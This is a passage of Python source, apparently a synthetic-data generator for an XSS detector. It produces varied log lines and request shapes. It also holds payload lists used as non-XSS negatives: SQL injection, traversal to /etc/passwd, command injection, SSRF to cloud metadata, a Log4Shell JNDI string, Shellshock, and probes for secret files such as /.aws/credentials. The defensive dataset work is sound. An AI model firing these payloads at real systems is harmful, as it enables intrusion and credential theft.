        return f"{_stamp(rng, 0)} {level:<5} [{rng.choice(['main', 'http-nio-8080-exec-' + str(rng.randint(1, 20)), 'scheduler-1', 'worker-' + str(rng.randint(1, 8))])}] c.{a[0]}.{b}.{a.capitalize()}Controller - {message}"
    if kind == 1:
        return f"{_stamp(rng, 0)} - {a}.{b} - {level} - {message}"
    if kind == 2:
        return f"{_stamp(rng, 3)} {rng.choice(['web01', 'app-2', 'db1', 'ip-10-0-0-12'])} {rng.choice(['sshd', 'nginx', 'cron', 'postfix/smtp', 'kernel', 'systemd', 'dockerd'])}[{rng.randint(100, 65000)}]: {message}"
    if kind == 3:
        record = {"ts": _stamp(rng, 1), "level": level.lower(), "msg": message, "method": "GET", "path": path, "query": query, "status": rng.choice([200, 200, 302, 404, 500]),
                  "ms": rng.randint(1, 900), "ip": _ip(rng), "ua": rng.choice(USER_AGENTS)}
        keys = rng.sample(list(record), rng.randint(3, len(record)))
        return json.dumps({key: record[key] for key in record if key in keys}, separators=rng.choice([(",", ":"), (", ", ": ")]), ensure_ascii=False)
    if kind == 4:
        return f'level={level.lower()} ts={_stamp(rng, 1)} caller={a}.go:{rng.randint(1, 900)} msg="{message}" {a}={b} duration={rng.randint(1, 900)}ms'
    if kind == 5:
        return (f'{_stamp(rng, 5)} [error] {rng.randint(100, 9999)}#{rng.randint(100, 9999)}: *{rng.randint(1, 99999)} open() "/var/www/html{path}" failed (2: No such file or directory), '
                f'client: {_ip(rng)}, server: {_host(rng)}, request: "GET {target} HTTP/1.1", host: "{_host(rng)}"')
    if kind in (6, 7):
        return _trace(rng)
    if kind == 8:  # IIS (W3C extended): spaces become + and the query is its own column
        return (f"{_stamp(rng, 6)} {_ip(rng)} GET {path} {query or '-'} {rng.choice([80, 443])} - {_ip(rng)} {rng.choice(USER_AGENTS[:5]).replace(' ', '+')} "
                f"{rng.choice(['-', 'https://' + _host(rng) + '/'])} {rng.choice([200, 200, 304, 404])} 0 0 {rng.randint(1, 900)}")
    if kind == 9:
        return f"{_stamp(rng, 6).replace(' ', ',')},{rng.choice(['GET', 'POST'])},{target},{rng.choice([200, 302, 404])},{rng.randint(1, 900)}"
    if kind == 10:
        return (f'user={rng.choice(FIRST_NAMES)} action={rng.choice(["login", "logout", "update_profile", "search", "checkout", "comment"])} result={rng.choice(["success", "denied"])} '
                f'ip={_ip(rng)} {rng.choice(["q", "value", "note", "ua"])}="{benign_value(rng)[:120]}"')
    if kind == 11:
        return rng.choice([f"Content-Security-Policy: default-src 'self'; script-src 'self' https://{_host(rng)}; object-src 'none'", f"Set-Cookie: session={_hex(rng, 24)}; HttpOnly; Secure; SameSite=Lax",
                           f"Referer: https://www.google.com/search?q={quote_plus(rng.choice(SECURITY_TALK))}", f"User-Agent: {rng.choice(USER_AGENTS[:-1])}", f"Location: https://{_host(rng)}/login?next=%2F{a}",
                           "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,*/*;q=0.8", f"Cookie: _ga={_token(rng)}; theme=dark; {a}={b}",
                           f"X-Forwarded-For: {_ip(rng)}, {_ip(rng)}", f"Authorization: Bearer {_token(rng)}", "X-Frame-Options: SAMEORIGIN"])
    if kind == 12:
        return rng.choice([f"curl -X POST https://{_host(rng)}/api/{a} -H 'Content-Type: application/json' -d '{json.dumps({a: b})}'", f'grep -r "{rng.choice(EVENT_HANDLERS)}" src/ | wc -l',
                           f"ls -la /var/log/{a} > {b}.txt 2>&1", f"docker run -e NODE_ENV=production -p {rng.randint(3000, 9000)}:8080 {a}:latest", f"git log --oneline | head -{rng.randint(2, 30)}",
                           f"psql -c \"select count(*) from {a} where {b} > {rng.randint(1, 99)}\"", f"find . -name '*.{rng.choice(['js', 'py', 'log'])}' -mtime +{rng.randint(1, 90)} | xargs rm"])
    if kind == 13:
        return _combined_line(target, rng)
    return f"[{_stamp(rng, 6)}] <{rng.choice(FIRST_NAMES)}> {benign_value(rng)[:160]}"


# ---- benign here: real attacks that are NOT XSS ---------------------------------

_SQLI = ["1' or '1'='1", "1 or 1=1--", "' or 1=1#", "1 union select username,password from users--", "admin'--", "1 and sleep(5)",
         "1;waitfor delay '0:0:5'--", "' and 1=convert(int,(select @@version))--", "1 order by 10--", "') or ('1'='1", "\" or \"\"=\"",
         "1' group by 1,2,3--+", "1 and ascii(substr((select password from users limit 1),1,1))>64", "0x31 or benchmark(5000000,md5(1))"]
_TRAVERSAL = ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "....//....//....//etc/passwd", "/etc/passwd%00", "..%2f..%2f..%2fetc%2fshadow",
              "file:///etc/passwd", "/proc/self/environ", "c:\\boot.ini", "..%c0%af..%c0%afetc/passwd", "../../../../var/log/apache2/access.log"]
_COMMAND = [";cat /etc/passwd", "|whoami", "`id`", "$(id)", "; ls -la /", "&& ping -c 3 127.0.0.1", "127.0.0.1; uname -a", "& dir c:\\", "|| sleep 5", "%0aid"]
_SSRF = ["http://169.254.169.254/latest/meta-data/", "http://127.0.0.1:6379/", "http://localhost/admin", "gopher://127.0.0.1:25/", "http://[::1]:8080/",
         "http://metadata.google.internal/computeMetadata/v1/", "http://0x7f000001/", "http://2130706433/", "https://evil.example@trusted.example/"]
_MISC = ["${jndi:ldap://203.0.113.9:1389/a}", "() { :; }; /bin/bash -c 'id'", '{"$gt":""}', "%0d%0aSet-Cookie:%20session=1", "*)(uid=*))(|(uid=*",
         "__import__('os').system('id')", "' || '1'=='1", "A" * 300, "%00", "{{7*7}}"]
_SCANNED = ["/.env", "/.git/config", "/wp-login.php", "/xmlrpc.php", "/phpmyadmin/index.php", "/admin/config.php", "/actuator/env", "/server-status",
            "/.aws/credentials", "/backup.sql", "/config.json", "/boaform/admin/formLogin", "/HNAP1/", "/manager/html", "/.DS_Store",
            "/autodiscover/autodiscover.xml", "/.svn/entries", "/web.config", "/id_rsa", "/admin.php", "/api/v1/pods", "/login.action", "/jenkins/script"]


def other_attack(rng: random.Random) -> str:
    """A request or value carrying a NON-XSS attack. For an XSS detector that is a benign row."""
    if rng.random() < 0.25:
        target = rng.choice(_SCANNED)
        return target if rng.random() < 0.7 else _combined_line(target, rng)
    payload = rng.choice(rng.choice([_SQLI, _SQLI, _TRAVERSAL, _COMMAND, _SSRF, _MISC]))
    shape = rng.random()
    if shape < 0.3:
        return payload
    key = rng.choice(["id", "file", "page", "user", "host", "url", "cmd", "path", "q", "cat", "item", "search", "redirect", "lang"])
    pairs = [(key, rng.choice([payload, quote(payload, safe=""), quote_plus(payload), payload.replace(" ", "+")]))]
    if rng.random() < 0.4:
        pairs.insert(rng.randrange(2), (rng.choice(synthetic.PARAMS), synthetic.value(rng)))
    target = _target_with(_path(rng), pairs, rng)
    if shape < 0.8:
        return target
    return _combined_line(target.replace(" ", "%20"), rng)


# ---- benign: other scripts and languages -----------------------------------------


def _phrase(rng: random.Random, language: str, low: int = 2, high: int = 8) -> str:
    words = SCRIPTS[language]
    return ("" if language in _UNSPACED else " ").join(rng.choice(words) for _ in range(rng.randint(low, high)))


def multilingual(rng: random.Random, plain: bool = False) -> str:
    """Text in another script or language. With `plain`, just the bare text (for use as a value)."""
    language = rng.choice(list(SCRIPTS))
    text = _phrase(rng, language)
    kind = 0 if plain else rng.randrange(10)
    if kind <= 1:
        return text + rng.choice(["", "", ".", "?", "!", "。", "।", " ?", "…"])
    if kind == 2:
        return f"{text} {rng.choice(['iphone 16', 'samsung', 'nike', 'wifi', 'pdf', 'ok', 'usb-c', 'google'])} {rng.randint(1, 9999)}"
    if kind == 3:
        return _target_with(_path(rng), [(rng.choice(["q", "search", "name", "city", "title"]), _encode(text, rng)), *[(k, _encode(v, rng)) for k, v in _query(rng)[:1]]], rng)
    if kind == 4:
        return rng.choice([f"<p>{text}</p>", f'<a href="/{_word(rng)}">{text}</a>', f"<b>{text}</b> {_phrase(rng, language)}", f"<h1>{text}</h1><p>{_phrase(rng, language, 4, 14)}</p>",
                           f'<span lang="{language[:2]}">{text}</span>', f"<li>{text}</li><li>{_phrase(rng, language)}</li>", f"<title>{text}</title>"])
    if kind == 5:
        return json.dumps({"ts": _stamp(rng, 1), "msg": text, "user": rng.choice(FIRST_NAMES), "lang": language[:2]}, ensure_ascii=rng.random() < 0.3)
    if kind == 6:
        return f"{text} {rng.choice([synthetic._email(rng), '#' + str(rng.randint(100, 99999)), 'https://' + _host(rng) + '/' + _word(rng)])}"
    if kind == 7:
        return rng.choice(["。", ". ", "! ", " — ", "\n"]).join(_phrase(rng, language, 3, 12) for _ in range(rng.randint(3, 7)))
    if kind == 8:
        return f"{rng.choice([text, synthetic.sentence(rng)])} {' '.join(rng.choice(_EMOJI) for _ in range(rng.randint(1, 4)))}"
    return f"{_stamp(rng)} INFO {rng.choice(['comment', 'search', 'message', 'title'])}=\"{text}\" user={rng.choice(FIRST_NAMES)}"


# ---- placing an EXISTING payload into one of the agent's shapes -----------------
# These never create a payload; they take one the caller already has (from the
# dataset or xss_augment.synthetic_attack) and wrap it as the agent would meet it.


def as_value(payload: str, rng: random.Random) -> str:
    """A payload as a raw parameter or form-field value: already how the detector sees it."""
    return payload


def as_request(payload: str, rng: random.Random) -> str:
    """A payload placed in one query parameter of an otherwise ordinary request target."""
    if payload.startswith(("http://", "https://", "/")):  # a payload that is itself a URL stays as-is
        return payload
    key = rng.choice(["q", "query", "search", "s", "name", "msg", "comment", "redirect", "ref", "callback", "returnUrl"])
    value = rng.choice([quote_plus(payload), quote(payload, safe=""), payload.replace(" ", "+"), payload])
    pairs = [(key, value)]
    if rng.random() < 0.4:
        pairs.insert(rng.randrange(2), (rng.choice(synthetic.PARAMS), synthetic.value(rng)))
    return _target_with(_path(rng), pairs, rng)


def as_line(payload: str, rng: random.Random) -> str:
    """A payload inside a log line, the way a server records the request that carried it."""
    target = as_request(payload, rng) if not payload.startswith(("http", "/")) else payload
    style = rng.randrange(4)
    if style == 0:
        return _combined_line(target.replace(" ", "%20"), rng)
    if style == 1:
        return f'{_stamp(rng, 3)} {rng.choice(["web01", "waf"])} modsec: Warning. detected request uri={target[:200]} client={_ip(rng)}'
    if style == 2:
        return json.dumps({"ts": _stamp(rng, 1), "level": "warn", "msg": "request blocked", "method": "GET", "path": target[:200], "ip": _ip(rng)}, separators=(",", ":"))
    return f'user={rng.choice(FIRST_NAMES)} action=comment result=blocked ip={_ip(rng)} body="{payload[:160]}"'
